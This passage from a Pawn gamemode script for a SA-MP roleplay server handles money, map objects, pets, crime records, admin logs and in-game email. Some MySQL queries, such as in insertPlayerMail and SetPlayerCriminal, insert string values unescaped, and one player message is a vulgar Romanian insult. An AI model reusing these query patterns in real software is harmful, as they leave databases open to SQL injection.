        return SCM(playerid, -1, "Nu ai bani si muie ireplay!");

    PlayerInfo[playerid][pAccountLY] -= sellCarMoneyPrefix;

    if(PlayerInfo[playerid][pAccount] - sellCarMoneySuffix < 0)
    {
        if(!PlayerInfo[playerid][pAccountLY])
            return SCM(playerid, -1, "Nu ai bani!");

        PlayerInfo[playerid][pAccount] += 1000000000 - PlayerInfo[playerid][pAccount] - sellCarMoneySuffix;
        
        PlayerInfo[playerid][pAccountLY] --;
    }
    else
        PlayerInfo[playerid][pAccount] -= sellCarMoneySuffix;

    return 1;
}


function CreateGateDynObjects()
{
    gateObject[0] = CreateDynamicObject(10184, 1592.67676, -1638.05225, 14.95110, 0.00000, 0.00000, -89.70000); // gate lspd
    gateObject[1] = CreateDynamicObject(10184, -1631.81848, 688.23511, 8.70330, 0.00000, 0.00000, 90.00000); // gate sfpd
    gateObject[2] = CreateDynamicObject(19313, 135.2833, 1941.3331, 21.6932, 0.0000, 0.0000, 0.0000,-1,-1,-1,300.0); // gate ng
    gateObject[3] = CreateDynamicObject(968, 1544.7007, -1630.7527, 13.2983, 0.0000, 90.0200, 90.0000,-1,-1,-1,300.0); // lspd bar
    gateObject[4] = CreateDynamicObject(968, -1572.216186, 658.646850, 7.224934, 0.0000, 90.0200, 90.0000,-1,-1,-1,300.0); // sfpd bar
    gateObject[5] = CreateDynamicObject(968, -1701.435302, 687.763061, 25.000843, 0.0000, 90.0200, -90.0000,-1,-1,-1,300.0); // sfpd bar 2

    return 1;
}
function LoadStock()
{
    for(new i = 1; i <= cache_num_rows(); i++)
    {
        new s = i - 1;
        Stock[i][vID]                               = cache_get_field_content_int(s, "ID");
        Stock[i][vStock]                            = cache_get_field_content_int(s, "Stock");
        Stock[i][vPrice]                            = cache_get_field_content_int(s, "Price");
        Stock[i][vModel]                            = cache_get_field_content_int(s, "vid");
        Stock[i][vSpeed]                            = cache_get_field_content_int(s, "speed");
        cache_get_field_content(s, "Car", Stock[i][vName], SQL, 130);
    }
    printf("LoadStock %d", cache_num_rows());
}
function LoadAllDynamicObjects() {
    // USA GARAJ FBI CreateDynamicObject(10184, 617.60950, -602.30725, 17.29980,   0.00000, 0.00000, 0.00000);


    // ceva dupa nephrite

    new cobj0 = CreateDynamicObject(19327, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000);
    SetDynamicObjectMaterial(cobj0, 1, 1420, "", "");
    new cobj1 = CreateDynamicObject(19980, -1754.833496, -595.210449, 15.396020, 0.000000, 0.000000, -172.380005);
    SetDynamicObjectMaterial(cobj1, 513, 1380, "", "");

    // USA MAFII
    CreateDynamicObject(1506, 2544.06641, -1306.37781, 1053.63586,   0.00000, 0.00000, 90.00000);
    CreateDynamicObject(1506, 2544.06641, -1304.89783, 1053.63586,   0.00000, 0.00000, 90.00000);

    // EVENT ARENA
    CreateDynamicObject(5107, 8131.84424, -7557.77441, 21.31974,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(13190, 8092.79590, -7557.67969, 17.86357,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(13190, 8092.77637, -7557.67041, 21.69334,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(13190, 8092.77148, -7557.67383, 25.57404,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(13190, 8092.75781, -7557.68311, 29.43032,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(16287, 8085.43555, -7564.92334, 11.59161,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(16287, 8090.56982, -7569.92725, 11.61662,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(16287, 8085.42822, -7550.02686, 11.59772,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(16287, 8095.47949, -7569.92676, 11.61662,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(16287, 8090.53174, -7544.91895, 11.61663,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(16287, 8095.47852, -7544.91504, 11.61662,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(16287, 8100.60156, -7549.99854, 11.61662,   0.00000, 0.00000, -360.00003);
    CreateDynamicObject(16287, 8100.60010, -7564.91455, 11.61662,   0.00000, 0.00000, -360.00003);
    CreateDynamicObject(8947, 8093.10303, -7560.52051, 18.51939,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(8947, 8093.11426, -7560.53613, 24.52295,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(8947, 8093.10352, -7560.52686, 26.99291,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(8947, 8097.21094, -7561.63770, 12.04439,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(8947, 8097.22314, -7553.22217, 12.01940,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(8947, 8088.83398, -7561.64404, 12.05525,   0.00000, 0.00000, -359.99997);
    CreateDynamicObject(8947, 8088.81201, -7553.23730, 12.04439,   0.00000, 0.00000, -360.00003);
    CreateDynamicObject(4193, 8111.32910, -7498.31055, 31.44644,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(10041, 8032.82227, -7497.01855, 45.16753,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(4058, 8047.18066, -7595.05029, 33.55188,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(4058, 8108.80957, -7613.34033, 25.23701,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(4682, 8096.74316, -7600.93604, 18.03067,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(4682, 8186.39941, -7550.15967, 22.69571,   0.00000, 0.00000, -989.99976);
    CreateDynamicObject(4113, 8187.83398, -7481.91797, 36.29269,   0.00000, 0.00000, 101.25001);
    CreateDynamicObject(4570, 7992.76074, -7555.49707, 49.23763,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(4570, 8153.17090, -7617.53174, 48.53752,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(4571, 8236.04785, -7480.54053, 51.21596,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(3268, 8155.90918, -7553.35352, 14.36662,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(3268, 8155.92822, -7575.60303, 14.36662,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(3268, 8155.93018, -7573.09180, 18.19459,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(3268, 8155.92139, -7553.29834, 18.19116,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(4570, 8102.35938, -7624.73633, 57.35464,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(4682, 8147.48584, -7497.79102, 30.86975,   0.00000, 0.00000, -809.99963);
    CreateDynamicObject(9910, 8157.54199, -7589.48975, 25.39473,   0.00000, 0.00000, -134.99997);
    CreateDynamicObject(9910, 8124.82959, -7589.49951, 25.33860,   0.00000, 0.00000, -134.99997);
    CreateDynamicObject(9910, 8170.17480, -7575.63916, 22.18861,   0.00000, 0.00000, -44.99999);
    CreateDynamicObject(9910, 8182.58154, -7519.66357, 27.21359,   0.00000, 0.00000, -225.00002);
    CreateDynamicObject(9910, 8188.66504, -7538.39795, 47.74644,   0.00000, 0.00000, -225.00002);
    CreateDynamicObject(9910, 8094.52393, -7495.31982, 25.78859,   0.00000, 0.00000, -315.00006);
    CreateDynamicObject(9917, 8215.37402, -7585.08643, 34.32093,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(9917, 8081.14697, -7440.34424, 30.99039,   0.00000, 0.00000, 89.99998);
    CreateDynamicObject(18450, 8134.48389, -7523.63770, 19.93480,   0.00000, 0.00000, -179.99997);
    CreateDynamicObject(18450, 8060.39258, -7523.63232, -0.59019,   0.00000, 30.93972, -179.99997);
    CreateDynamicObject(8229, 8096.59375, -7534.57568, 16.94285,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(8229, 8108.25488, -7534.63477, 16.84285,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(8229, 8120.01416, -7534.65332, 16.86785,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(8229, 8172.48779, -7529.99268, 16.91785,   0.00000, 0.00000, -146.25000);
    CreateDynamicObject(3268, 8155.93701, -7553.31885, 15.28433,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(3268, 8155.91846, -7553.30127, 16.15442,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(3268, 8155.92578, -7553.29443, 17.02787,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(3268, 8155.92236, -7553.31152, 17.61886,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(975, 8167.36377, -7533.67383, 16.04131,   0.00000, 0.00000, 33.75002);
    CreateDynamicObject(975, 8155.01758, -7531.88770, 16.04131,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(975, 8146.13232, -7531.81982, 16.04131,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(975, 8141.76953, -7527.35010, 16.04131,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(8886, 8137.57275, -7544.12207, 17.79440,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(8886, 8137.58887, -7544.11523, 21.22811,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(8886, 8137.59082, -7543.86084, 21.21184,   179.62262, 0.00000, 89.99998);
    CreateDynamicObject(8886, 8112.26953, -7542.10889, 14.34441,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(8886, 8079.29980, -7586.33008, 14.34440,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(10773, 8105.36377, -7594.32227, 14.02387,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(8886, 8137.96680, -7520.91797, 14.34440,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(8886, 8158.07275, -7519.39404, 14.24440,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(8886, 8144.48389, -7548.29395, 17.79440,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(8886, 8166.40674, -7548.23535, 17.56940,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(8886, 8166.39990, -7553.76074, 17.59440,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(3268, 8155.93018, -7566.93262, 14.36662,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(8886, 8154.67920, -7556.83936, 14.26940,   0.00000, 0.00000, -269.99994);
    CreateDynamicObject(8886, 8155.95557, -7574.64160, 14.19440,   0.00000, 0.00000, -359.99997);
    CreateDynamicObject(8886, 8169.37842, -7570.28857, 14.19440,   0.00000, 0.00000, -269.99994);
    CreateDynamicObject(8886, 8142.33887, -7570.32471, 14.06940,   0.00000, 0.00000, -269.99994);
    CreateDynamicObject(8886, 8145.82861, -7581.98047, 17.54440,   0.00000, 0.00000, -359.99997);
    CreateDynamicObject(3268, 8155.93213, -7575.58691, 18.18340,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(8886, 8152.46289, -7582.12988, 14.21941,   0.00000, 0.00000, -359.99997);
    CreateDynamicObject(18260, 8154.32324, -7568.63037, 15.81481,   0.00000, 0.00000, -11.25003);
    CreateDynamicObject(18260, 8162.89551, -7581.72803, 15.81481,   0.00000, 0.00000, -179.99997);
    CreateDynamicObject(18260, 8157.46289, -7550.15869, 15.86481,   0.00000, 0.00000, -449.99997);
    CreateDynamicObject(5428, 8114.52100, -7494.75879, 15.39824,   -0.85944, 0.00000, -539.99988);
    CreateDynamicObject(8229, 8131.81934, -7534.68506, 17.06784,   0.00000, 0.00000, -180.00002);
    CreateDynamicObject(8229, 8143.81348, -7523.75293, 17.01785,   0.00000, 0.00000, -90.00004);
    CreateDynamicObject(5107, 7986.95850, -7524.04150, 21.34902,   0.00000, 0.00000, -179.99997);
    CreateDynamicObject(1492, 8169.92188, -7585.58643, 14.35846,   0.00000, 0.00000, -179.99997);
    CreateDynamicObject(1497, 8142.04199, -7585.52441, 14.35465,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1497, 8142.01172, -7563.33643, 14.35465,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(18260, 8146.63477, -7567.67969, 15.93981,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(1497, 8142.00781, -7576.94775, 14.35465,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1437, 8135.71875, -7548.68555, 15.62885,   10.31324, 0.00000, 0.00000);
    CreateDynamicObject(1437, 8135.71680, -7548.73438, 20.07629,   10.31324, 0.00000, 0.00000);
    CreateDynamicObject(1437, 8145.01514, -7585.66992, 15.62885,   9.45380, 0.00000, 0.00000);
    CreateDynamicObject(1437, 8145.00586, -7585.61572, 20.79356,   9.45380, 0.00000, 0.00000);
    CreateDynamicObject(1437, 8172.58594, -7531.13623, 22.07913,   10.31324, 0.00000, 0.00000);
    CreateDynamicObject(1437, 8172.57861, -7531.14551, 28.25908,   10.31324, 0.00000, 0.00000);
    CreateDynamicObject(1437, 8172.46777, -7531.09863, 34.39047,   10.31324, 0.00000, 0.00000);
    CreateDynamicObject(1437, 8082.02832, -7568.90479, 16.55498,   10.31324, 0.00000, -89.99998);
    CreateDynamicObject(1437, 8081.99414, -7568.90918, 22.58348,   10.31324, 0.00000, -89.99998);
    CreateDynamicObject(1437, 8082.00537, -7568.91406, 25.83324,   10.31324, 0.00000, -89.99998);
    CreateDynamicObject(1437, 8077.97754, -7593.53369, 15.62885,   10.31324, 0.00000, -179.99997);
    CreateDynamicObject(1437, 8077.99121, -7593.52295, 21.74604,   10.31324, 0.00000, -179.99997);
    CreateDynamicObject(1437, 8077.99316, -7593.50000, 27.75269,   10.31324, 0.00000, -179.99997);
    CreateDynamicObject(1437, 8077.99023, -7593.45850, 32.17966,   10.31324, 0.00000, -179.99997);
    CreateDynamicObject(1635, 8071.80859, -7593.08936, 19.40563,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(1635, 8072.61182, -7519.09668, 18.12557,   0.00000, 0.00000, 89.99998);
    CreateDynamicObject(1635, 8067.36768, -7546.94043, 22.60154,   0.00000, 0.00000, 180.00002);
    CreateDynamicObject(1635, 8125.54248, -7590.24365, 18.56382,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(1635, 8150.25586, -7590.18408, 18.38124,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(1635, 8170.53369, -7536.85400, 20.93207,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1635, 8173.98975, -7524.76025, 24.34968,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1687, 8087.87109, -7585.62891, 38.60769,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1687, 8096.48926, -7589.43408, 38.60769,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1688, 8103.01904, -7585.02002, 38.81908,   0.00000, 0.00000, -269.99994);
    CreateDynamicObject(1688, 8114.15967, -7596.80127, 56.66604,   0.00000, 0.00000, -269.99994);
    CreateDynamicObject(1689, 8104.87305, -7589.12842, 39.00718,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1689, 8095.14209, -7598.22705, 56.85414,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1687, 8083.17236, -7596.31250, 56.45465,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(1687, 8132.16406, -7592.25244, 39.11093,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1687, 8145.69727, -7592.23193, 39.16706,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1687, 8173.56494, -7579.02344, 35.96095,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(1688, 8174.22949, -7588.15430, 36.17234,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1687, 8161.72461, -7562.52148, 26.92328,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(1688, 8162.31934, -7571.24707, 26.91760,   0.00000, 0.00000, -359.99997);
    CreateDynamicObject(1688, 8177.56982, -7527.30762, 41.19732,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1688, 8177.08105, -7516.06982, 41.19732,   0.00000, 0.00000, 89.99998);
    CreateDynamicObject(1687, 8175.26465, -7535.66211, 43.27273,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1687, 8174.27246, -7557.85156, 43.27273,   0.00000, 0.00000, 89.99998);
    CreateDynamicObject(1689, 8175.43945, -7544.75244, 43.67221,   0.00000, 0.00000, 89.99998);
    CreateDynamicObject(1689, 8093.44141, -7492.05273, 39.96041,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1687, 8085.01563, -7491.08838, 39.56092,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1687, 8070.73291, -7596.64941, 33.83205,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1688, 8078.04004, -7492.18604, 19.20200,   0.00000, 0.00000, -179.99997);
    CreateDynamicObject(1635, 8089.43848, -7494.62842, 22.50600,   0.00000, 0.00000, 89.99998);
    CreateDynamicObject(1635, 8091.17627, -7541.89551, 20.57246,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(1687, 8090.37109, -7552.17627, 33.17936,   0.00000, 0.00000, -89.99998);
    CreateDynamicObject(8661, 8087.17920, -7514.84473, 18.07185,   -89.38136, 0.00000, 0.00000);
    CreateDynamicObject(8661, 8129.15234, -7515.66211, 20.90702,   -89.38136, 0.00000, 0.00000);
    CreateDynamicObject(8661, 8157.16064, -7515.38672, 20.07667,   -89.38136, 0.00000, 0.00000);
    CreateDynamicObject(9910, 8170.84912, -7495.96387, 14.76549,   0.00000, 0.00000, -135.00003);
    CreateDynamicObject(9910, 8137.54297, -7500.13428, 17.75253,   0.00000, 0.00000, -135.00003);
    CreateDynamicObject(7921, 8085.90479, -7533.29688, 13.26363,   0.00000, 0.00000, -180.00002);

    //GIFTBOX

    CreateDynamicObject(19054, -1977.8044, 115.0125, 27.6940 - 0.4, 0.0, 0.0, 0.2);
    CreateStreamed3DTextLabel("{FFFFFF}>> {FF0000}GIFTBOX {FFFFFF}<<\nUse {FF0000}/getgift {FFFFFF}to open the gift", -1, -1977.8044, 115.0125, 27.6940 + 0.25, 40.0, 0);

    // bug house
    CreateDynamicObject(19303, 442.47998, 509.23032, 1001.63678,   0.00000, 0.00000, 90.00000,-1,-1,-1,300.0);
    CreateDynamicObject(19304, 453.06204, 507.98209, 1001.92603,   0.00000, 0.00000, 90.00000,-1,-1,-1,300.0);
    CreateDynamicObject(19304, 453.11362, 509.63824, 1001.92603,   0.00000, 0.00000, 90.00000,-1,-1,-1,300.0);

    CreateGateDynObjects();

        //NG BAZA
    CreateDynamicObject(19312, 191.14, 1870.04, 21.48,0.0000, 0.0000, 0.0000,-1,-1,-1,300.0);

     // Hq Bug
    CreateDynamicObject(19357, 968.4691, -53.4128, 1001.8241, 0.0000, 0.0000, 0.0000,-1,-1,-1,300.0);

    //SFPD
    CreateDynamicObject(955, 2273.52612, 2429.61206, 10.21940, 0.00000, 0.00000, 0.00000,-1,-1,-1,300.0); //usa
    CreateDynamicObject(1569, 2293.94946, 2492.96411, 2.28980,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.0); //dozatorul
    CreateDynamicObject(19313, 2251.27319, 2498.03394, 5.56540,   0.00000, 0.00000, -90.36000,-1,-1,-1,300.0); //gratii

    //Lspd Object
    CreateDynamicObject(2952, 1581.99524, -1637.93494, 12.36840,   0.00000, 0.00000, 90.00000);
    CreateDynamicObject(983, 1545.0706787109, -1635.6511230469, 13.237774848938, 0, 0, 0,-1,-1,-1,300.0);
    CreateDynamicObject(983, 1544.4979248047, -1620.7434082031, 13.238116264343, 0, 0, 0,-1,-1,-1,300.0);

    //Garduri Fish
    CreateDynamicObject(970, 382.19919, -2042.00671, 7.32180,   0.00000, 0.00000, 0.00000,-1,-1,-1,500.0);
    CreateDynamicObject(970, 378.70398, -2045.08789, 7.32180,   0.00000, 0.00000, -91.98001,-1,-1,-1,500.0);
    CreateDynamicObject(970, 378.51715, -2050.44434, 7.32180,   0.00000, 0.00000, -92.76000,-1,-1,-1,500.0);
    CreateDynamicObject(970, 352.48499, -2050.70313, 7.29520, 0.00000, 0.00000, 0.00000,-1,-1,-1,500.0);
    return 1;
}

function auninvitePlayer(playerid, punishAmount, const stringReason[])
{
    if(!cache_num_rows())
        return SCM(playerid, -1, "Acest jucator nu exista.");

    new targetName[MAX_PLAYER_NAME];
    cache_get_field_content(0, "name", targetName);

    SetPVarInt(playerid, "au_punishAmount", punishAmount);
    SetPVarInt(playerid, "au_targetId", cache_get_field_content_int(0, "id"));
    SetPVarString(playerid, "au_targetPlayer", targetName);
    SetPVarString(playerid, "au_uninvReason", stringReason);

    SetPVarInt(playerid, "au_targetRank", cache_get_field_content_int(0, "Rank"));
    SetPVarInt(playerid, "au_targetMember", cache_get_field_content_int(0, "Member"));
    SetPVarInt(playerid, "au_targetFDays", cache_get_field_content_int(0, "FactionJoin"));

    format(gString, sizeof gString, "Esti sigur ca doresti sa-l demiti pe %s din factiunea sa cu %d FP pe motiv: %s", targetName, punishAmount, stringReason);
    Dialog_Show(playerid, DIALOG_AUNINVITE, DIALOG_STYLE_MSGBOX, "Confirm:", gString, "Da", "Nu");
    return 1;
}

function PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
    if(IsPlayerConnected(playerid))
    {
        new Float:oldposx, Float:oldposy, Float:oldposz;
        new Float:tempposx, Float:tempposy, Float:tempposz;
        GetPlayerPos(playerid, oldposx, oldposy, oldposz);
        tempposx = (oldposx -x);
        tempposy = (oldposy -y);
        tempposz = (oldposz -z);
        if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
        {
            return 1;
        }
    }
    return 0;
}

function AdminLog(playerid, const string[], va_args<>)
{
    new
        stringMessage[144];

    va_format(stringMessage, sizeof stringMessage, string, va_start<2>);
    mysql_real_escape_string(stringMessage, gQuery);

    mysql_format(SQL, gString, sizeof gString, "insert into log_admin (`playerId`, `log_text`, `unixtime`) values ('%d', '%s', '%d')", PlayerInfo[playerid][pSQLID], gQuery, gettime());
    mysql_tquery(SQL, gString, "", "");
    return 1; 
}

function RemovePet(playerid) 
{
    return PlayerInfo[playerid][pPetStatus] = 0, DestroyDynamic3DTextLabel(playerPet[playerid]), RemovePlayerAttachedObject(playerid, 9);
}

function AttachPet(playerid)
{
    PlayerInfo[playerid][pPetStatus] = 1;

    switch(PlayerInfo[playerid][pPetSkin]) {
        case 19079: SetPlayerAttachedObjectEx(playerid, 9, PlayerInfo[playerid][pPetSkin], 1, 0.330000, -0.100000, -0.129999, 0.000000, 0.000000, 0.000000, 0.800000, 1.000000, 1.000000);
        case 1607: SetPlayerAttachedObjectEx(playerid, 9, PlayerInfo[playerid][pPetSkin], 1, 0.349999, -0.061524, -0.140000, 0.000000, 100.000000, 0.000000, 0.090000, 0.050000, 0.050000);
        case 1609: SetPlayerAttachedObjectEx(playerid, 9, PlayerInfo[playerid][pPetSkin], 1, 0.360000, 0.000000, -0.129999, 0.000000, 100.000000, 0.000000, 0.100000, 0.100000, 0.100000);
        case 1608: SetPlayerAttachedObjectEx(playerid, 9, PlayerInfo[playerid][pPetSkin], 1, 0.360000, -0.061524, -0.140000, 0.000000, 100.000000, 0.000000, 0.050000, 0.029999, 0.050000);
        case 1371: SetPlayerAttachedObjectEx(playerid, 9, PlayerInfo[playerid][pPetSkin], 1, 0.400000, 0.000000, -0.140000, 0.000000, 100.000000, 160.000000, 0.150000, 0.150000, 0.150000);
    }

    format(gString, sizeof gString, "{fff000}Lvl. %d {00ff00}%s", PlayerInfo[playerid][pPetLevel], PlayerInfo[playerid][pPetName]);
    playerPet[playerid] = CreateDynamic3DTextLabel(gString, COLOR_WHITE, 357.120239, 1.712298, 349.232513, 20.0, playerid, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
    Streamer_SetFloatData(STREAMER_TYPE_3D_TEXT_LABEL, playerPet[playerid], E_STREAMER_ATTACH_OFFSET_Z, 0); Streamer_SetFloatData(STREAMER_TYPE_3D_TEXT_LABEL, playerPet[playerid], E_STREAMER_ATTACH_OFFSET_X, 0) ;
    return 1;
}

function ViewPet(playerid) {
    
    gString[0] = (EOS);

    format(gString, 144, "Nivel animal de companie: %d/20 | Pet Points: %d/%d", PlayerInfo[playerid][pPetLevel], PlayerInfo[playerid][pPetPoints], PlayerInfo[playerid][pPetLevel] * 100); SCM(playerid, COLOR_GREEN, gString);
    format(gString, 144, "Deoarece animalul tau de companie are level %d vei primi drept recompensa la fiecare Pay Day %s (daca nu joci) sau %s (daca joci)", PlayerInfo[playerid][pPetLevel], FormatNumber(PlayerInfo[playerid][pPetLevel] * 10000), FormatNumber(PlayerInfo[playerid][pPetLevel] * 10000 * 2)); SendSplitMessage(playerid, COLOR_GREY, gString);
    return 1; 
}

function pUpdateInt(playerid, const varname[], varnameingame) 
{
    gQuery[0] = (EOS);
    mysql_format(SQL, gQuery, sizeof gQuery, "update `users` SET `%s` = '%d' WHERE `id` = '%d' LIMIT 1", varname, varnameingame, PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gQuery, "", "");
    return 1; 
}

function ShowPlayerMDC(playerid, targetId)
{
    if(!strmatch(PlayerInfo[playerid][pCrime1], "Fara Crima") && !strmatch(PlayerInfo[playerid][pCrime1], "Fara"))
        SCMF(targetId, -1, "%s", PlayerInfo[playerid][pCrime1]);

    if(!strmatch(PlayerInfo[playerid][pCrime2], "Fara Crima") && !strmatch(PlayerInfo[playerid][pCrime2], "Fara"))
        SCMF(targetId, -1, "%s", PlayerInfo[playerid][pCrime2]);

    if(!strmatch(PlayerInfo[playerid][pCrime3], "Fara Crima") && !strmatch(PlayerInfo[playerid][pCrime3], "Fara"))
        SCMF(targetId, -1, "%s", PlayerInfo[playerid][pCrime3]);

    return 1;
}

function SetPlayerCriminal(playerid, declare, points, const reason[])
{
    PlayerInfo[playerid][pCrimes] += 1;

    format(PlayerInfo[playerid][pVictim], 32, "%s", (declare == -1 ? ("Unknown") : (GetName(declare))));

    if(strmatch(PlayerInfo[playerid][pCrime1], "Fara Crima"))
        format(PlayerInfo[playerid][pCrime1], 64, reason);

    else if(strmatch(PlayerInfo[playerid][pCrime2], "Fara Crima"))
        format(PlayerInfo[playerid][pCrime2], 64, reason);

    else if(strmatch(PlayerInfo[playerid][pCrime3], "Fara Crima"))
        format(PlayerInfo[playerid][pCrime3], 64, reason);            

    else if(strmatch(PlayerInfo[playerid][pCrime1], "Fara Crima") && strmatch(PlayerInfo[playerid][pCrime2], "Fara Crima") && strmatch(PlayerInfo[playerid][pCrime3], "Fara Crima")) {}
    else
    {
        format(PlayerInfo[playerid][pCrime1], 64, reason);

        format(PlayerInfo[playerid][pCrime2], 64, "Fara Crima");
        format(PlayerInfo[playerid][pCrime3], 64, "Fara Crima");
    }

    PlayerInfo[playerid][pWantedLevel] += points;
    SetPlayerWanted(playerid);

    sendDepartmentMessage(1, COLOR_DBLUE, "Dispatch: %s [%d] has committed a crime: %s. Reporter: %s. W: +%d. New wanted level: %d.", GetName(playerid), playerid, reason, PlayerInfo[playerid][pVictim], points, PlayerInfo[playerid][pWantedLevel]);

    if(PlayerInfo[playerid][pLanguage] == 2)
        format(gString, sizeof gString, "Ai comis o infractiune: %s, raportat de: %s. W: +%d. Nivel de urmarire nou: %d.", reason, PlayerInfo[playerid][pVictim], points, PlayerInfo[playerid][pWantedLevel]);
    else
        format(gString, sizeof gString, "You committed a crime: %s, reported by: %s. W: +%d. New wanted level: %d.", reason, PlayerInfo[playerid][pVictim], points, PlayerInfo[playerid][pWantedLevel]);

    SCM(playerid, COLOR_WARNING, gString);

    mysql_format(SQL, gString, sizeof gString, "update `users` set `Crime1` = '%s', `Crime2` = '%s', `Crime3` = '%s', `Accused` = '%s', `Victim` = '%s', `WantedLevel` = '%d' where `id` = '%d';", PlayerInfo[playerid][pCrime1], PlayerInfo[playerid][pCrime2], PlayerInfo[playerid][pCrime3], PlayerInfo[playerid][pAccused], PlayerInfo[playerid][pVictim], PlayerInfo[playerid][pWantedLevel]+2, PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    return 1;
}

function CheckPlayersNewEmails()
{
    if(!cache_num_rows())
        return 1;

    new
        targetSQLId;

    for(new i, j = cache_get_row_count (); i != j; ++ i)
    {
        targetSQLId = cache_get_field_content_int(i, "iPlayer");

        foreach(new x : Player)
        {
            if(PlayerInfo[x][pSQLID] == targetSQLId && s_PlayerInfo[x][pSLoggedIn] && s_PlayerInfo[x][pSNextNotify] <= gettime())
            {
                s_PlayerInfo[x][pSNextNotify] = gettime() + 3600;
                SCM(x, COLOR_YELLOW, "{FF6200}**{FFFF00} You have unread email(s). Use /email to read it. {FF6200}**");
                break;
            }
        }
    }
    return 1;
}

function insertPlayerMail(sqlid, iTime, const message[], va_args<>)
{
    va_format(gString, sizeof gString, message, va_start<3>);
        
    mysql_format(SQL, gString, sizeof gString, "insert into `emails` (`sMessage`, `iPlayer`, `iTimestamp`) values ('%s', '%d', '%d');", gString, sqlid, iTime);
    mysql_tquery(SQL, gString, "", "");
    return 1;
}

function WhenPlayerReadEmail(playerid, emailid)
{
    new
        emailMessage[256], emailTime, dateFormat[6];

    cache_get_field_content(0, "sMessage", emailMessage, SQL, sizeof emailMessage);
    emailTime = cache_get_field_content_int(0, "iTimestamp");

    TimestampToDate(emailTime, dateFormat[0], dateFormat[1], dateFormat[2], dateFormat[3], dateFormat[4], dateFormat[5], 2);

    format(gString, sizeof gString, "Email #%d\n%s\nSent on: %02d-%02d-%02d %02d:%02d:%02d", s_PlayerInfo[playerid][pSDialogItems][s_PlayerInfo[playerid][pSDialogSelected]], emailMessage, dateFormat[0], dateFormat[1], dateFormat[2], dateFormat[3], dateFormat[4], dateFormat[5]);
